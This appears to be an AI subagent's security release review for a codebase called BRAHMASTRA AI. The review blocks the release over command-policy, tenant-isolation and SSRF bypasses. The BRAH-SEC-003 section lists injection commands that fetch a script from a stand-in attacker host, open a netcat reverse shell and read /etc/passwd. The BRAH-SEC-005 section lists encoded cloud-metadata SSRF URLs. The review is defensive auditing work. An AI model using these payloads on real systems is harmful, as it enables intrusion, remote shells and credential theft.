# BRAHMASTRA AI — Cycle 2 Pre-Commit Release Review

**Review Type:** Independent Pre-Commit Release Gate
**Independent Reviewer:** Independent Security Release Auditor (Autonomous Subagent `68965151-db11-44cd-be1d-009db34cd2d3`)
**Lead Coordinator:** Antigravity (Agent 0)
**Date:** 2026-11-11
**Target:** Cycle 2 Remediations for `BRAH-SEC-001` through `BRAH-SEC-005`
**Overall Release Gate Verdict:** **RELEASE BLOCKED — DO NOT STAGE, COMMIT, OR PUSH**

---

## 1. Executive Summary & Verdict Matrix

The independent release gate conducted an adversarial challenge against the Cycle 2 remediations. While two findings are genuinely and robustly fixed (**BRAH-SEC-002** and **BRAH-SEC-004**), the independent auditor discovered critical bypasses in **BRAH-SEC-003** (command substitution under `--yes`), structural hijacking risks in **BRAH-SEC-001** (`assign_account_to_organization`), and trivial encoding bypasses in **BRAH-SEC-005** (SSRF IP integer/DNS aliases).

| Finding ID | Severity | Previous Claim | Independent Auditor Verdict | Exploitability | Release Blocker? |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **BRAH-SEC-001** | **HIGH** | VERIFIED FIXED | **PARTIALLY FIXED** | Medium (Unauthorized account attachment & global listing) | **YES** |
| **BRAH-SEC-002** | **HIGH** | VERIFIED FIXED | **VERIFIED FIXED** | None (Argv leak purged; fail-closed verified) | No |
| **BRAH-SEC-003** | **MEDIUM** | VERIFIED FIXED | **PARTIALLY FIXED** | **Critical** (Arbitrary code execution under `--yes`) | **YES (CRITICAL)** |
| **BRAH-SEC-004** | **MEDIUM** | VERIFIED FIXED | **VERIFIED FIXED** | None (Defense-in-depth parameter separation `--`) | No |
| **BRAH-SEC-005** | **LOW** | VERIFIED FIXED | **PARTIALLY FIXED** | High (SSRF integer/hex/DNS alias bypasses) | **YES** |

---

## 2. Actual Git State & Diff Inspection

### Git Status
```text
On branch main
Your branch is up to date with 'origin/main'.

Changes not staged for commit:
	modified:   docs/security/risk-register.md
	modified:   docs/security/security-council-board.md
	modified:   src/brahmastra/application/use_cases/credential_use_cases.py
	modified:   src/brahmastra/cli/commands/patch.py
	modified:   src/brahmastra/domain/patch/command_policy.py
	modified:   src/brahmastra/infrastructure/providers/ollama.py
	modified:   src/brahmastra/infrastructure/vault/macos_keychain.py
	tests/security/test_command_policy_security.py
	tests/security/test_keychain_security.py
	tests/security/test_tenant_isolation_security.py
	tests/unit/test_vault.py

Untracked files:
	docs/security/decision-log-cycle2.md
	docs/security/post-remediation-independent-report.md
	docs/security/remediation-plan-cycle2.md
	security/
	tests/security/test_ollama_security.py
```

### Git Diff Statistics
```text
 docs/security/risk-register.md                     |  30 ++-
 docs/security/security-council-board.md            |  27 ++-
 src/brahmastra/application/use_cases/credential_use_cases.py  |  45 ++++-
 src/brahmastra/cli/commands/patch.py               |   4 +-
 src/brahmastra/domain/patch/command_policy.py      |  44 ++++-
 src/brahmastra/infrastructure/providers/ollama.py  |  17 +-
 src/brahmastra/infrastructure/vault/macos_keychain.py         |  31 ++--
 tests/security/test_command_policy_security.py     |  46 +++++
 tests/security/test_keychain_security.py           |  12 ++
 tests/security/test_tenant_isolation_security.py   | 205 +++++++++++++++++++++
 tests/unit/test_vault.py                           |  23 +--
 11 files changed, 429 insertions(+), 55 deletions(-)
```

### Git Diff Quality Check (`git diff --check`)
- `docs/security/risk-register.md:45`: Trailing whitespace detected.
- `tests/security/test_command_policy_security.py:80`: Blank line at EOF.
- `tests/security/test_keychain_security.py:68`: Blank line at EOF.
- `tests/security/test_tenant_isolation_security.py:389`: Blank line at EOF.
- **Secrets & Debug Code Check:** Zero plaintext secrets, zero `print()` / `pdb` / `breakpoint()` statements in production code.

---

## 3. Security Challenge & Independent Auditor Findings

### BRAH-SEC-001: Organization Scoping & Tenant Isolation
- **Auditor Verdict:** **PARTIALLY FIXED**
- **Strengths Verified:**
  - `_verify_account_organization_scoping` successfully blocks cross-tenant rotation, revocation, deletion, and addition when an account is scoped strictly to Organization A and the caller operates as Organization B.
  - When caller is unscoped (`target_org is None` and active org is `None`), lines 54–66 verify whether `OrganizationAssignmentModel` contains any record for `account.id`. If assignments exist, it raises `PermissionError` immediately.
  - In `list_credentials`, unscoped callers receive zero credentials for org-assigned accounts via `outerjoin(...).where(OrganizationAssignmentModel.id.is_(None))`.
- **Vulnerabilities Discovered by Independent Auditor:**
  1. **Unauthorized Account Assignment Hijacking (`assign_account_to_organization`):**
     In `credential_use_cases.py:179-212`, `assign_account_to_organization(account_name, org_name)` performs **zero authorization or ownership verification**. Any caller belonging to Organization B can attach Organization A's existing account name (`account_name`) to Organization B. Once assigned, `_verify_account_organization_scoping` finds an assignment for Organization B, granting Organization B full permission to rotate, revoke, or delete Organization A's operational keys.
  2. **Global Account Enumeration:**
     `list_provider_accounts` (lines 135–177) does not enforce active organization scoping when `org_name` is omitted, returning all accounts across all tenants and facilitating targeting for Attack Path 1.
  3. **Multi-Org Account Conflation:**
     Credentials in `CredentialModel` are linked to `account_id`, not `organization_id`. Sharing accounts across organizations grants all assigned tenants mutual destructive access.

### BRAH-SEC-002: macOS Keychain Subprocess Argv Exposure
- **Auditor Verdict:** **VERIFIED FIXED**
- **Strengths Verified:**
  - Plaintext password in `argv` (`-w <secret>`) in `store_secret` has been completely deleted.
  - Implemented fail-closed behavior: if native `Security.framework` C bindings fail to load, `store_secret` immediately raises a `RuntimeError` rather than falling back to an insecure subprocess.
  - Memory cleanup with `_CFRelease(item_ref)` added in `store_secret`.
- **Residual Risk (Non-Exploitable):**
  - In `get_secret` and `has_secret`, `item_ref` is allocated by `SecKeychainFindGenericPassword` but `_CFRelease` is not called, creating a minor CoreFoundation memory leak during high-frequency reads. This is an engineering hygiene defect, not a security breach.

### BRAH-SEC-003: Sensitive File Disclosure & Command Policy Gating
- **Auditor Verdict:** **PARTIALLY FIXED (CRITICAL BYPASSES ACTIVE)**
- **Strengths Verified:**
  - `cat` unconditionally removed from `SAFE_COMMAND_PREFIXES`.
  - Static sensitive patterns (`.env`, `.aws/`, `id_rsa`, `.npmrc`, `*.key`) detected in direct and quote-stripped command paths.
  - Symlinks canonicalized with `Path.resolve()`.
  - In `patch.py`, `--yes` auto-approval is restricted to `CommandRiskLevel.SAFE_READ`.
- **Critical Vulnerabilities Discovered by Independent Auditor:**
  1. **Command Substitution RCE under `SAFE_READ`:**
     In `CommandPolicyEngine.evaluate`:
     ```python
     is_safe = any(cleaned_cmd.startswith(prefix) for prefix in cls.SAFE_COMMAND_PREFIXES)
     if is_safe and not any(op in cleaned_cmd for op in [">", "|", "&&", ";"]):
         return ShellCommandAction(..., risk_level=CommandRiskLevel.SAFE_READ)
     ```
     The operator check only inspects `[">", "|", "&&", ";"]`. It **fails to block command substitution (`$()`, `` ` ``), input redirection (`<`), and newlines (`\n`)**!
     - `ls $(curl http://attacker.com/script.sh)` -> Evaluates to **`SAFE_READ`**!
     - `git diff $(nc -e /bin/sh attacker.com 4444)` -> Evaluates to **`SAFE_READ`**!
     - `ls $(cat /etc/passwd)` -> Evaluates to **`SAFE_READ`**!
     - `ls\ncurl http://attacker.com/exfil` -> Evaluates to **`SAFE_READ`**!
  2. **Silent Auto-Approval via `--yes`:**
     Because the commands above evaluate to `CommandRiskLevel.SAFE_READ`, the `--yes` flag in `brahmastra patch eval-cmd --yes` auto-approves them without user confirmation.
  3. **Substring Matching:**
     `cleaned_cmd.startswith(prefix)` matches non-whitelisted binaries starting with those characters (e.g. `lsof -i` starts with `ls` and is classified as `SAFE_READ`).

### BRAH-SEC-004: Pytest Flag and Option Injection
- **Auditor Verdict:** **VERIFIED FIXED**
- **Strengths Verified:**
  - Target parameter starting with `-` rejected with `ValueError`.
  - Path traversal targets escaping repository working directory rejected via `(cwd / file_part).resolve().is_relative_to(cwd)`.
  - Command invocation explicitly passes `--` delimiter before positional targets.
  - Subprocess called with typed argument list (`List[str]`) without `shell=True`.

### BRAH-SEC-005: Local Inference Daemon SSRF Protection
- **Auditor Verdict:** **PARTIALLY FIXED (TRIVIAL BYPASSES ACTIVE)**
- **Strengths Verified:**
  - Scheme validation restricts endpoints to `http` and `https`.
  - Legitimate local endpoints (`127.0.0.1`, `localhost`, `[::1]`) function normally.
- **Vulnerabilities Discovered by Independent Auditor:**
  - The check in `ollama.py:44-48` relies solely on an exact 3-string blacklist match:
    ```python
    if hostname in ("169.254.169.254", "metadata.google.internal", "metadata.internal"):
    ```
  - Trivially bypassed by alternative IP encodings and DNS aliases:
    - **Integer IP:** `http://2852039166:80` -> **ALLOWED** (resolves to 169.254.169.254).
    - **Hex IP:** `http://0xa9fea9fe:80` -> **ALLOWED** (resolves to 169.254.169.254).
    - **IPv6-Mapped IPv4:** `http://[::ffff:169.254.169.254]:80` -> **ALLOWED**.
    - **Wildcard / Rebinding DNS:** `http://169.254.169.254.nip.io:80` -> **ALLOWED**.
    - **IPv6 AWS IMDSv2:** `http://[fd00:ec2::254]:80` -> **ALLOWED**.
    - **Internal RFC 1918 Probing:** `http://10.0.0.1:80`, `http://192.168.1.1:80` -> **ALLOWED**.

---

## 4. Test Evidence

### Full Pytest Execution
- **Command:** `.venv/bin/pytest -v -W default`
- **Total Tests Collected:** 150
- **Total Tests Passed:** 150 (100%)
- **Total Tests Failed:** 0
- **Total Tests Skipped:** 0
- **Execution Duration:** 3.04 seconds
- **Pytest Warnings:** 28 `ResourceWarning: unclosed database in <sqlite3.Connection>` (standard Python 3.13 garbage collection notice during in-memory SQLite fixture teardown).

### Dedicated Security Regression Breakdown (44 Tests)
- `tests/security/test_command_policy_security.py`: **17 passed**
- `tests/security/test_execution_security.py`: **2 passed**
- `tests/security/test_keychain_security.py`: **2 passed**
- `tests/security/test_ollama_security.py`: **11 passed**
- `tests/security/test_tenant_isolation_security.py`: **12 passed**

> **Test Coverage Gap Note:** While all 44 security tests passed, the existing test suite did NOT assert against command substitution (`$()`), newlines (`\n`), integer IP encodings, or `assign_account_to_organization` cross-tenant hijacking. This proves once again that passing tests do not equal secure software.

---

## 5. Independent Verification Disclosure

In accordance with release gate requirements:
- **Independent Verifier:** Autonomous Subagent `68965151-db11-44cd-be1d-009db34cd2d3` ("Independent Security Release Auditor"), running with an isolated context, read-only tools, and an adversarial threat brief.
- The auditor did not accept any claims from the implementation team and generated live executable PoCs demonstrating the bypasses described above.

---

## 6. Recommended Action & Commit Scope

### Release Gate Status: **BLOCKED**

### Release Blockers:
1. **BRAH-SEC-003**: Fix command substitution (`$()`, `` ` ``), newlines (`\n`), input redirection (`<`), and exact token prefix matching in `CommandPolicyEngine`.
2. **BRAH-SEC-001**: Restrict `assign_account_to_organization` so that an account already assigned to one organization cannot be silently co-opted by another organization without authorization.
3. **BRAH-SEC-005**: Replace the string blacklist in `OllamaAdapter` with canonical IP resolution (`socket.getaddrinfo` + `ipaddress`) rejecting link-local, private, and reserved ranges (unless loopback).

### Staging & Push Recommendation:
- **DO NOT** stage, commit, or push the current working tree.
- Await human direction on whether to initiate a targeted Cycle 3 remediation cycle to close these three remaining gaps before cutting the release.
